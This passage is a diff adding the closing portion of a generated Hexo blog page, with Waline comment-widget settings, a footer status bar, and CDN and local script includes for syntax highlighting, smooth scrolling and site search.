+              emoji: ["https://unpkg.com/@waline/emojis@1.2.0/weibo","https://unpkg.com/@waline/emojis@1.2.0/alus"],
+              requiredMeta: [],
+              login: 'disable',
+              wordLimit: 0,
+              pageSize: 10,
+              imageUploader: false,
+              highlighter: true,
+              texRenderer: false,
+              search: false,
+              pageview: false,
+              comment: true,
+              copyright: false,
+              
+              // 自动适配主题
+              dark: document.documentElement.getAttribute('data-theme') === 'dark' ? 'auto' : false,
+              
+              // 评论框占位符
+              placeholder: 'Feel free to leave a comment, no login required!',
+              
+              // 元数据配置
+              meta: ['nick', 'mail', 'link'],
+              
+              // 表情配置
+              emojiCDN: 'https://unpkg.com/@waline/emojis@1.2.0/',
+            });
+            
+            // 监听主题变化
+            const observer = new MutationObserver((mutations) => {
+              mutations.forEach((mutation) => {
+                if (mutation.type === 'attributes' && mutation.attributeName === 'data-theme') {
+                  const isDark = document.documentElement.getAttribute('data-theme') === 'dark';
+                  // Waline 会自动处理主题切换
+                  if (waline) {
+                    waline.update({ dark: isDark ? 'auto' : false });
+                  }
+                }
+              });
+            });
+            
+            observer.observe(document.documentElement, {
+              attributes: true,
+              attributeFilter: ['data-theme']
+            });
+          });
+        };
+        walineScript.src = 'https://unpkg.com/@waline/client@v3/dist/waline.js';
+        document.body.appendChild(walineScript);
+      </script>
+    
+    
+  </div>
+
+      </article>
+    </div>
+  </div>
+</div>
+
+    </div>
+    <footer class="footer">
+  <div class="status-bar">
+    <div class="status-item">
+      <i class="fas fa-code-branch"></i>
+      master
+    </div>
+    <div class="status-item">
+      <i class="fas fa-sync"></i>
+      heart22
+    </div>
+    <div class="status-item">
+      <i class="fas fa-clock"></i>
+      2025-10-16
+    </div>
+    <div class="status-item">
+      Designed By&nbsp; <a href="https://github.com/B143KC47" target="_blank"> BlackCat</a>
+    </div>
+    <div class="status-item github">
+      <a href="#" target="_blank">
+        <i class="fab fa-github"></i>
+      </a>
+    </div>
+  </div>
+</footer>
+
+    
+    <!-- 全局配置 -->
+    <script>
+      window.HEXO_CONFIG = {
+        language: "en",
+        root: "/"
+      };
+      
+      // 特定于搜索的配置
+      window.VSC4T_SEARCH = {
+        root: "/"
+      };
+    </script>
+    
+    <script src="//cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/highlight.js@11.7.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <!-- 这里可以放置自定义脚本 -->
+<script>
+document.addEventListener('DOMContentLoaded', (event) => {
+  // Apply smooth scroll to non-TOC anchor links
+  document.querySelectorAll('a[href^="#"]:not(.toc-link)').forEach(anchor => {
+    anchor.addEventListener('click', function (e) {
+      e.preventDefault();
+      // Check if querySelector is valid before using it
+      try {
+        const targetSelector = this.getAttribute('href');
+        // Basic check for potentially invalid selectors (though not exhaustive)
+        if (targetSelector && targetSelector.length > 1) { 
+          const targetElement = document.querySelector(targetSelector);
+          if (targetElement) {
+            targetElement.scrollIntoView({
+              behavior: 'smooth'
+            });
+          } else {
+            console.warn('Smooth scroll target not found:', targetSelector);
+          }
+        } else {
+           console.warn('Invalid href for smooth scroll:', targetSelector);
+        }
+      } catch (error) {
+        console.error('Error during smooth scroll:', error, 'Selector:', this.getAttribute('href'));
+        // Fallback or alternative behavior if needed
+        // For example, try getElementById if it's just an ID
+        const targetId = this.getAttribute('href').slice(1);
+        try {
+            const targetElementById = document.getElementById(decodeURIComponent(targetId));
+            if (targetElementById) {
+                targetElementById.scrollIntoView({ behavior: 'smooth' });
+            }
+        } catch (idError) {
+             console.error('Fallback getElementById also failed:', idError);
+        }
+      }
+    });
+  });
+});
+</script>
+
+<!-- Scripts -->
+<script>
+  // 将语言文件中的翻译传递给前端
+  window.HEXO_CONFIG = {
+    language: "en",
+    search_placeholder: "Type to search...",
+    search_no_results: "No results found",
+    search_result: "result",
+    search_results: "results",
+    search_results_found: "Found undefined results",
+    search_in: "Search in",
+    search_in_title: "Title",
+    search_in_content: "Content",
+    search_in_tags: "Tags",
+    search_in_categories: "Categories",
+    search_filters: "Search Filters",
+    search_recent: "Recent Searches",
+    search_clear: "Clear",
+    search_loading: "Loading...",
+    search_error: "Error loading search data"
+  };
+</script>
+
+
+
+<!-- 添加所有需要的脚本 -->
+<script src="../../../../js/main.js"></script>
+<script src="../../../../js/search.js"></script>
+
+
+    <script>
+      // 移动端菜单切换
+      $(document).ready(function() {
+        $('.mobile-menu-toggle').click(function() {
+          $('.sidebar-explorer').toggleClass('show');
+        });
+      });
+    </script>
+  </body>
+</html>
